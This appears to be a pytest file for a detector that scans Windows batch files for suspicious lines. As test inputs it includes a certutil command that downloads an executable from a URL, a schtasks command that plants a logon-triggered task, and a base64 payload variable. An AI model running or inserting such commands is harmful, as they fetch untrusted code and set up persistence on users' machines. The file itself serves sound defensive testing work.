from detectors.bat_detector import scan_bat


def test_clean_bat_is_not_suspicious():
    text = "@echo off\necho Hello world\ndir\n"
    is_suspicious, findings = scan_bat(text)
    assert is_suspicious is False
    assert findings == []


def test_download_command_is_flagged():
    text = "@echo off\ncertutil -urlcache -f http://example.com/a.exe a.exe\n"
    is_suspicious, findings = scan_bat(text)
    assert is_suspicious is True
    assert any("certutil" in f and "Line 2" in f for f in findings)


def test_multiple_suspicious_lines_are_all_flagged():
    text = (
        "@echo off\n"
        "set payload=base64encodedstuff\n"
        "schtasks /create /tn evil /tr evil.exe /sc onlogon\n"
    )
    is_suspicious, findings = scan_bat(text)
    assert is_suspicious is True
    assert len(findings) >= 2
    assert any("base64" in f for f in findings)
    assert any("schtasks" in f for f in findings)
